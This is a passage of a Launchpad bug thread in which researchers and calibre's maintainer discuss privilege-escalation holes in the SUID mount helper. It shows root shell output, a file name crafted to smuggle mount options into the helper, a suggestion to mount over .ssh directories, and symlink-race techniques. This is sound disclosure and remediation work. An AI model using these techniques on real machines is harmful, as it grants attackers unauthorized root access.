ZX2C4-Laptop zx2c4 # umount /etc
ZX2C4-Laptop zx2c4 # whoami
root
ZX2C4-Laptop zx2c4 # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)



Have a nice day.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Released &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T13:15:52.096297+00:00" title="2011-11-02 13:15:52 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fun entertaining future ideas:</p>
<p>Mount over /root/.ssh. Mount over /home/special-<wbr />user/.ssh.</p>
<p>&quot;But the permissions!&quot; you cry out.</p>
<p>So first you mount it like normal:</p>
<p>calibre-<wbr />mount-helper mount overlay /path/to</p>
<p>Then the second time you remount with the uid settings you want:</p>
<p>touch -- &#x27;-ouid=<wbr />1234,gid=<wbr />1234,umask=<wbr />345,remount&#x27;<br />
calibre-<wbr />mount-helper mount -ouid=1234,<wbr />gid=1234,<wbr />umask=345,<wbr />remount /path/to</p>
<p>This is thanks to #4.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fun entertaining future ideas:

Mount over /root/.ssh. Mount over /home/special-user/.ssh.

"But the permissions!" you cry out.

So first you mount it like normal:

calibre-mount-helper mount overlay /path/to

Then the second time you remount with the uid settings you want:

touch -- '-ouid=1234,gid=1234,umask=345,remount'
calibre-mount-helper mount -ouid=1234,gid=1234,umask=345,remount /path/to

This is thanks to #4.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T13:25:32.826286+00:00" title="2011-11-02 13:25:32 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>It is irresponsible and a disservice to your users to introduce security vulnerabilities onto their machines unless you have very explicitly and carefully documented to those users that installing your software introduces security risks.</p>
<p>Can you explain why pmount, which is supported at least on Debian, Ubuntu, Red Hat, Gentoo, Fedora, Slackware, SuSE, and CentOS, is an unacceptable alternative?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">It is irresponsible and a disservice to your users to introduce security vulnerabilities onto their machines unless you have very explicitly and carefully documented to those users that installing your software introduces security risks. 

Can you explain why pmount, which is supported at least on Debian, Ubuntu, Red Hat, Gentoo, Fedora, Slackware, SuSE, and CentOS, is an unacceptable alternative?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~steffensiebert" class="sprite person">Steffen Siebert (steffensiebert)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T13:26:55.180748+00:00" title="2011-11-02 13:26:55 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I didn&#x27;t test it and I admit that I&#x27;m not a linux guru, but isn&#x27;t the CALIBRE_<wbr />DEVELOP_<wbr />FROM environment variable feature sufficient to do anything (including getting root) on a linux system with calibre installed, as I can execute arbitrary python code with it?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I didn't test it and I admit that I'm not a linux guru, but isn't the CALIBRE_DEVELOP_FROM environment variable feature sufficient to do anything (including getting root) on a linux system with calibre installed, as I can execute arbitrary python code with it?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~d--" class="sprite person">David (d--)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T14:38:53.575383+00:00" title="2011-11-02 14:38:53 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I don&#x27;t see how the CALIBRE_<wbr />DEVELOP_<wbr />FROM  environment variable would give an non-root user root.  This bug is about the SUID mount helper (which is written in C not python) .</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I don't see how the CALIBRE_DEVELOP_FROM  environment variable would give an non-root user root.  This bug is about the SUID mount helper (which is written in C not python) .

 </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~steffensiebert" class="sprite person">Steffen Siebert (steffensiebert)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T14:56:32.731120+00:00" title="2011-11-02 14:56:32 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sorry, my bad. I didn&#x27;t realize that the mount helper is SUID and not the calibre executable.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Sorry, my bad. I didn't realize that the mount helper is SUID and not the calibre executable.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T21:38:07.021802+00:00" title="2011-11-02 21:38:07 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Status changed to &#x27;Confirmed&#x27; because the bug affects multiple users.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Status changed to 'Confirmed' because the bug affects multiple users.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T00:09:32.236470+00:00" title="2011-11-03 00:09:32 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2583680/+files/60calibrerassaultmount.sh">exploit PoC 2</a>
        <a class="sprite edit action-icon" href="/calibre/+bug/885027/+attachment/2583680">Edit</a>
        (2.8 KiB,
        text/x-sh)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T01:58:16+00:00" title="2011-11-03 01:58:16 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Problems with pmount:</p>
<p>1) It does not work out of the box on all distros (it needs configuration)<br />
2) It may not even be installed on some distros, for example, it isn&#x27;t<br />
installed by default on gentoo.<br />
3) It has been deprecated in favor of udisks (which incidentally calibre tries<br />
to use before falling back to the mount helper)</p>
<p>So, no, pmount is not a suitable replacement.</p>
<p>Fix committed for the latest exploit. Feel free to re-open if you find another<br />
exploit based on 4.</p>
<p>&nbsp;status fixreleased</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Problems with pmount:

1) It does not work out of the box on all distros (it needs configuration)
2) It may not even be installed on some distros, for example, it isn't
installed by default on gentoo.
3) It has been deprecated in favor of udisks (which incidentally calibre tries
to use before falling back to the mount helper)

So, no, pmount is not a suitable replacement. 

Fix committed for the latest exploit. Feel free to re-open if you find another
exploit based on 4. 

 status fixreleased</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T02:24:05.751372+00:00" title="2011-11-03 02:24:05 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2583746/+files/60calibrerassaultmount.sh">exploit PoC 2.1</a>
        <a class="sprite edit action-icon" href="/calibre/+bug/885027/+attachment/2583746">Edit</a>
        (2.9 KiB,
        text/x-sh)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Updated the exploit.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Updated the exploit.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Released &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T03:03:34+00:00" title="2011-11-03 03:03:34 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ah, realpath()</p>
<p>&nbsp;status fixreleased</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ah, realpath()

 status fixreleased</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T03:33:30.056139+00:00" title="2011-11-03 03:33:30 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>There&#x27;s still a symlink race condition. If at first the symlink points to /dev/something-<wbr />legit or /media/<wbr />something-<wbr />legit, the symlink can be swapped easily by hooking into inotify&#x27;s IN_ACCESS and changing what it points to just in time for mount to be called with the s ymlink pointing someplace naughty. An example of the technique is presented here: <a rel="nofollow" href="http://www.exploit-db.com/exploits/17932/">http://<wbr />www.exploit-<wbr />db.com/<wbr />exploits/<wbr />17932/</a> .</p>
<p>So, the vulnerability still stands.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">There's still a symlink race condition. If at first the symlink points to /dev/something-legit or /media/something-legit, the symlink can be swapped easily by hooking into inotify's IN_ACCESS and changing what it points to just in time for mount to be called with the s ymlink pointing someplace naughty. An example of the technique is presented here: http://www.exploit-db.com/exploits/17932/ .

So, the vulnerability still stands.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T04:07:32+00:00" title="2011-11-03 04:07:32 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Easily remedied by calling realpath on dev at the start of main()</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Easily remedied by calling realpath on dev at the start of main()</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-03T10:48:09.488068+00:00" title="2011-11-03 10:48:09 UTC">on 2011-11-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Still unfixed.  There are still exploitable race conditions present that allow you to mount whatever you want wherever you want.</p>
<p>For example, to mount a device not under /dev, simply provide an argv[2] referring to a symlink pointing to somewhere in /dev, and after the realpath()&#x27;d version is checked, switch the target to somewhere else.  If you want to do this properly, you need to update the device source such that after calling realpath(), all subsequent references to the device are to the realpath()&#x27;d version.</p>
<p>The same trick can be applied to mount on top of arbitrary mountpoints (which is a local root hole).  First mount something you can write to onto a mountpoint in /media, and then exploit the race condition similar to above (switching from a mountpoint within /media to anywhere you like).</p>
<p>Even without these critical bugs, being able to mount anything in /dev on top of anything in /media is not a good idea - pmount restricts this to removable devices or devices whitelisted in a configuration file (/etc/pmount.<wbr />allow).  And you&#x27;ve done nothing to address the previously mentioned abilities to play with creating and removing arbitrary directories/files.  I strongly recommend giving up on implementing this yourself and instead creating a dependency on pmount or bundling it with your package (it&#x27;s GPLv3, so it&#x27;s license-<wbr />compatible)<wbr />.  It is very difficult to do what you want to do safely, and it is unacceptable to permit root privilege escalation vulnerabilities without documenting it.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Still unfixed.  There are still exploitable race conditions present that allow you to mount whatever you want wherever you want.

